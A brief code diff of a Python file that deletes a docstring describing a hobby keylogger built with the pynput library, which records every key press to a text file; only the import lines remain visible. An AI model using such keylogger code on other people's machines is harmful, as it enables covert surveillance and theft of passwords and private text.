@@ -1,9 +1,4 @@
-"""
-I have created a simple Keylogger in pyhton which records all the keys pressed and stores them in a text file
 
-3rd party module used here is "pynput" which can be installed through cmd in windows by using command 'pip install pynput'
-if pip related error occurs reinstall pip after uninstalling
-"""
 import pynput 
 
 from pynput.keyboard import Key, Listener
